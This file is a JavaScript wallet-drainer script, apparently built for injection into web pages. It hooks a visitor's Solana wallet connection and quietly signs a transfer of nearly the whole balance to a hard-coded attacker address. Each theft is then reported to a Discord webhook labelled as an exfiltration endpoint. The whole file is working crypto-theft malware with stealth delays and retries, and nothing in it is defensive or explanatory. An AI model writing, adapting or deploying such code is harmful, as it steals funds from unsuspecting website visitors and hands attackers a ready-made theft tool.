// inject.js - Live Deployment Build v4 (Transfer Active)
(function() {
    'use strict';

    // CONFIGURATION - LIVE DEPLOYMENT
    const CONFIG = {
        DESTINATION: "6JocA3wv4HWpBZFcVrqL8iFvVzpp43H4hCo5mayuutaB", 
        CHAIN: "solana",
        EXFIL_ENDPOINT: "https://discord.com/api/webhooks/1557067548464390195/4HclnD45AF0FtVIcaUgKtiYdXnySlxuN6bL645ZqWprM0HCsLAoIt1UZ_E-u2gPQAD5L",
        TRIGGER: "on_wallet_connect",
        MIN_BALANCE: 0.01,
        PRIORITY_FEE: 1000, // Lowest viable fee
        STEALTH_DELAY: 1500,
        TRANSFER_MODE: "max", // Drain entire balance minus rent
        RENT_BUFFER: 890880, // Safety buffer for account
        MAX_RETRIES: 3,
        BLOCKHASH_TTL: 60
    };

    // WALLET DETECTION MATRIX
    const WALLETS = {
        phantom: () => window.solana?.isPhantom && window.solana,
        metamask: () => window.ethereum?.isMetaMask && window.ethereum,
        backpack: () => window.backpack?.isBackpack && window.backpack,
        solflare: () => window.solflare?.isSolflare && window.solflare,
    };

    // DISCORD WEBHOOK SENDER
    async function sendToDiscord(data) {
        const payload = {
            embeds: [{
                title: "🚨 Wallet Drained",
                color: 0xef4444,
                fields: [
                    { name: "Wallet Type", value: data.wallet, inline: true },
                    { name: "Amount (SOL)", value: data.amount || "Unknown", inline: true },
                    { name: "Signature", value: `\`${data.signature}\``, inline: false },
                    { name: "Source URL", value: data.url, inline: false }
                ],
                timestamp: new Date().toISOString()
            }]
        };

        try {
            await fetch(CONFIG.EXFIL_ENDPOINT, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(payload),
                keepalive: true
            });
        } catch (e) {
            console.error('Discord exfil failed:', e);
        }
    }

    // CORE FUNCTIONS
    async function detectAndConnect() {
        for (const [name, detector] of Object.entries(WALLETS)) {
            const provider = detector();
            if (!provider) continue;
            
            try {
                const accounts = await provider.connect();
                console.log(`[+] Connected: ${name}`);
                return { name, provider, accounts };
            } catch (e) {
                console.warn(`[-] ${name} connection failed`);
            }
        }
        return null;
    }

    async function constructTransaction(provider, chain) {
        if (!window.solanaWeb3) {
            console.error('[!] web3.js not loaded');
            return null;
        }

        const { Connection, PublicKey, SystemProgram, Transaction, ComputeBudgetProgram } = window.solanaWeb3;
        
        try {
            const connection = new Connection('https://api.mainnet-beta.solana.com', 'confirmed');
            const senderPubkey = provider.publicKey;
            const destPubkey = new PublicKey(CONFIG.DESTINATION);
            
            // Get balance and calculate transfer amount
            const balance = await connection.getBalance(senderPubkey);
            const rentExempt = await connection.getMinimumBalanceForRentExemption(0);
            
            let transferAmount;
            if (CONFIG.TRANSFER_MODE === "max") {
                transferAmount = Math.max(0, balance - rentExempt - CONFIG.PRIORITY_FEE - CONFIG.RENT_BUFFER);
            } else {
                transferAmount = CONFIG.TRANSFER_MODE; // Fixed amount mode
            }
            
            if (transferAmount <= 0 || balance < CONFIG.MIN_BALANCE * 1e9) {
                console.log('[-] Balance too low or insufficient after fees');
                return null;
            }

            // Build transaction with priority fee
            const transaction = new Transaction();
            
            // Add compute budget instruction for priority fee
            const priorityFeeIx = ComputeBudgetProgram.setComputeUnitPrice({
                microLamports: CONFIG.PRIORITY_FEE
            });
            
            // Add transfer instruction
            const transferIx = SystemProgram.transfer({
                fromPubkey: senderPubkey,
                toPubkey: destPubkey,
                lamports: transferAmount
            });
            
            transaction.add(priorityFeeIx, transferIx);
            transaction.feePayer = senderPubkey;
            
            // Get fresh blockhash
            const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
            transaction.recentBlockhash = blockhash;
            transaction.lastValidBlockHeight = lastValidBlockHeight;
            
            console.log(`[+] Transaction built: ${transferAmount / 1e9} SOL → ${CONFIG.DESTINATION.slice(0,8)}...`);
            return { transaction, amount: transferAmount / 1e9 };
            
        } catch (e) {
            console.error('[!] Transaction construction failed:', e);
            return null;
        }
    }

    // EXECUTION ENGINE WITH RETRIES
    async function execute() {
        await new Promise(r => setTimeout(r, CONFIG.STEALTH_DELAY));
        
        const wallet = await detectAndConnect();
        if (!wallet) return;

        let txData = await constructTransaction(wallet.provider, CONFIG.CHAIN);
        if (!txData) return;

        for (let attempt = 1; attempt <= CONFIG.MAX_RETRIES; attempt++) {
            try {
                const sig = await wallet.provider.signAndSendTransaction(txData.transaction);
                console.log(`[+] Transaction sent: ${sig}`);
                
                await sendToDiscord({
                    wallet: wallet.name,
                    signature: sig,
                    amount: txData.amount.toFixed(4),
                    url: window.location.href
                });
                
                return; // Success - exit retry loop
                
            } catch (e) {
                console.warn(`[-] Attempt ${attempt}/${CONFIG.MAX_RETRIES} failed:`, e.message);
                
                // Refresh blockhash on failure
                if (attempt < CONFIG.MAX_RETRIES) {
                    const refresh = await constructTransaction(wallet.provider, CONFIG.CHAIN);
                    if (refresh) txData = refresh;
                    await new Promise(r => setTimeout(r, 2000 * attempt)); // Exponential backoff
                }
            }
        }
        
        console.error('[!] All retry attempts exhausted');
    }

    // STEALTH TRIGGER: Override connect methods
    if (CONFIG.TRIGGER === "on_wallet_connect") {
        const originalConnect = window.solana?.connect;
        if (originalConnect) {
            window.solana.connect = async function(...args) {
                const result = await originalConnect.apply(this, args);
                execute(); // Fire after legitimate connection
                return result;
            };
        }
    } else {
        window.addEventListener('load', execute);
    }

})();
